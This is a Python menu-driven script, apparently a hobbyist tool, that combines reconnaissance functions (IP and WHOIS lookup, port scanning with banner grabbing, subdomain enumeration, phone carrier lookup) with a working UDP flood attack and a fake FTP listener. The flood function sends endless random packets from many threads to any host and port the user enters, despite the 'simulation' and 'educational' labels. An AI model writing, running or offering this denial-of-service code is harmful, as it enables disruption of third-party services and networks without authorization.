import socket
import requests
import subprocess
import pyfiglet
import phonenumbers
from phonenumbers import geocoder, carrier
import random
import threading

# ANSI escape codes for colors
RED = "\033[31m"  # Red
GREEN = "\033[32m"  # Green
RESET = "\033[0m"  # Reset to default

def print_author_name():
    """Display 'AYUSH' as a banner in ASCII art with red color."""
    ascii_art = pyfiglet.figlet_format("AYUSH")
    print(f"{RED}{ascii_art}{RESET}")  # Red colored banner

banner = f"""
{RED}=====================================
Tool for Ddos and info gathering 
         (Educational Purposes Only)    
         author:- AYUSH SINGH              
====================================={RESET}
"""

def get_ip_info(domain):
    """Retrieve IP information."""
    try:
        ip = socket.gethostbyname(domain)
        print(f"IP Address: {ip}")
    except Exception as e:
        print(f"Error retrieving IP: {e}")

def get_http_headers(url):
    """Fetch HTTP headers of a URL."""
    try:
        response = requests.get(url)
        print("\nHTTP Headers:")
        for key, value in response.headers.items():
            print(f"{key}: {value}")
    except Exception as e:
        print(f"Error fetching headers: {e}")

def scan_ports_with_versions(ip, ports=[21, 22, 80, 443]):
    """Scan ports and attempt to grab the service version."""
    print("\nScanning Ports and Detecting Versions:")
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2)  # Set timeout for port connection
            result = s.connect_ex((ip, port))
            if result == 0:
                print(f"Port {port} is open", end="")
                try:
                    # Attempt to grab the banner
                    s.send(b"\r\n")
                    banner = s.recv(1024).decode().strip()
                    print(f" | Service Version: {banner}")
                except Exception:
                    print(" | Service Version: Not Available")
            else:
                print(f"Port {port} is closed")

def run_whois(domain):
    """Retrieve WHOIS information of a domain."""
    print("\nWHOIS Info:")
    try:
        result = subprocess.check_output(['whois', domain], text=True)
        print(result)
    except Exception as e:
        print(f"Error running WHOIS: {e}")

def get_phone_info(phone_number):
    """Fetch phone number information."""
    print("\nPhone Number Information:")
    try:
        parsed_number = phonenumbers.parse(phone_number)
        country = geocoder.description_for_number(parsed_number, 'en')
        service_provider = carrier.name_for_number(parsed_number, 'en')
        valid = phonenumbers.is_valid_number(parsed_number)

        print(f"Country: {country}")
        print(f"Service Provider: {service_provider}")
        print(f"Valid Number: {valid}")
    except Exception as e:
        print(f"Error fetching phone number info: {e}")

def subdomain_finder(domain):
    """Find subdomains for the given domain."""
    subdomains = [
        "www", "mail", "ftp", "blog", "test", "dev", "api", "portal", 
        "webmail", "staging", "support", "secure", "shop", "docs", "ns1", "ns2"
    ]
    print("\nSubdomain Enumeration:")
    found_subdomains = []
    for subdomain in subdomains:
        full_url = f"{subdomain}.{domain}"
        try:
            ip = socket.gethostbyname(full_url)
            print(f"Subdomain: {full_url} | IP: {ip}")
            found_subdomains.append((full_url, ip))
        except socket.gaierror:
            pass

    if not found_subdomains:
        print("No subdomains found.")
    else:
        print(f"\nTotal Subdomains Found: {len(found_subdomains)}")

def perform_ddos(target, port, thread_count):
    """Perform a simple DDoS attack simulation with packet count tracking."""
    packet_count = 0  # Initialize packet count

    def attack():
        nonlocal packet_count
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_to_send = random._urandom(1024)
                s.sendto(bytes_to_send, (target, port))
                packet_count += 1
                print(f"\rPackets Sent: {packet_count} | Data: {bytes_to_send[:10]}...", end="")
            except Exception as e:
                print(f"\nError: {e}")
                break

    print(f"\nStarting DDoS Simulation on {target}:{port} with {thread_count} threads")
    for _ in range(thread_count):
        thread = threading.Thread(target=attack)
        thread.start()

def start_fake_ftp():
    """Start a simple Fake FTP Server."""
    try:
        print("\nStarting Fake FTP Server...")
        # Create a socket to listen for incoming connections
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind(("0.0.0.0", 21))  # Bind to all network interfaces on port 21
        server_socket.listen(5)  # Allow up to 5 simultaneous connections
        print("Fake FTP Server running on port 21...")

        while True:
            client_socket, client_address = server_socket.accept()
            print(f"Connection received from {client_address}")
            # Send initial FTP banner
            client_socket.send(b"220 (Fake FTP Server ready)\r\n")
            
            while True:
                # Receive client data
                data = client_socket.recv(1024).decode().strip()
                if not data:
                    break  # Client disconnected
                print(f"Received command: {data}")
                
                if data.upper() == "QUIT":
                    client_socket.send(b"221 Goodbye.\r\n")
                    break  # End the session

                # Respond to unsupported commands
                client_socket.send(b"502 Command not implemented.\r\n")
            
            client_socket.close()
            print(f"Connection closed from {client_address}")

    except Exception as e:
        print(f"Error in Fake FTP Server: {e}")

if __name__ == "__main__":
    # Display the main banners
    print_author_name()
    
    print(banner)

    # Display menu options in green
    print(f"{GREEN}Welcome to Information Gathering Tool!")
    print(f"{GREEN}Choose an option:{RESET}")
    print(f"{GREEN}1. Domain/IP Info{RESET}")
    print(f"{GREEN}2. Phone Number Info{RESET}")
    print(f"{GREEN}3. Subdomain Finder{RESET}")
    print(f"{GREEN}4. Advanced Powerful DDoS Tool{RESET}")
    print(f"{GREEN}5. Start Fake FTP Server{RESET}")
    
    choice = input(f"{GREEN}Enter your choice (1/2/3/4/5): {RESET}")

    if choice == "1":
        target = input("Enter the target domain or IP: ")
        try:
            ip = socket.gethostbyname(target)
        except socket.gaierror:
            ip = None

        get_ip_info(target)
        get_http_headers(f"http://{target}")
        if ip:
            scan_ports_with_versions(ip)
        run_whois(target)
    elif choice == "2":
        phone_number = input("Enter the phone number with country code (e.g., +1xxxxxxxxxx): ")
        get_phone_info(phone_number)
    elif choice == "3":
        domain = input("Enter the domain for subdomain enumeration: ")
        subdomain_finder(domain)
    elif choice == "4":
        target = input("Enter the target IP or domain for DDoS: ")
        port = int(input("Enter the target port: "))
        threads = int(input("Enter the number of threads: "))
        perform_ddos(target, port, threads)
    elif choice == "5":
        start_fake_ftp()
    else:
        print("Invalid choice! Exiting.")